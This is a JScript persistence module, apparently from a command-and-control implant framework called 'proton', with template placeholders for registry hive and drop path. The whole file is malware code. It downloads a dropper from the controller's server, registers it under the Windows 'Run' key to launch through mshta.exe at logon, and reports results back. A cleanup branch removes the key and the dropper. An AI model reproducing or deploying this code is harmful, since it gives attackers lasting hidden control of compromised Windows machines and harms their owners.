try
{
    var headers = {};
    var path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    var droppath = proton.file.getPath("~FDROPDIR~\\~FDROPFILE~");
    var key = "Proton";

    if (~CLEANUP~)
    {
        headers["Task"] = "DeleteKey";
        var hkey = ~FHKEY~;
        var hkeyname = "";
        switch(hkey)
        {
            case 0x80000001:
                hkeyname = "HKCU";
                break;
            case 0x80000002:
                hkeyname = "HKLM";
                break;
            default:
                break;
        }
        var retval = proton.shell.exec("reg delete "+hkeyname+"\\"+path+" /v "+key+" /f", "~DIRECTORY~\\"+proton.uuid()+".txt");
        proton.work.report(retval, headers);
        headers["Task"] = "DeleteDropper";
        proton.file.deleteFile(droppath);
        proton.work.report(proton.FS.FileExists(droppath).toString()+"~~~"+droppath, headers);
    }
    else
    {
        proton.registry.write(~FHKEY~, path, key, "C:\\Windows\\system32\\mshta.exe "+droppath, proton.registry.STRING);
        headers["Task"] = "AddKey";
        var retval = proton.registry.read(~FHKEY~, path, key, proton.registry.STRING).SValue;
        proton.work.report(retval, headers);

        headers["X-UploadFileJob"] = "true";
        proton.http.downloadEx("POST", proton.work.make_url(), headers, droppath);
        headers["X-UploadFileJob"] = "false";
        headers["Task"] = "AddDropper";
        proton.work.report(proton.FS.FileExists(droppath).toString()+"~~~"+droppath, headers);
    }

    proton.work.report("Complete");

}
catch (e)
{
    proton.work.error(e);
}

proton.exit();
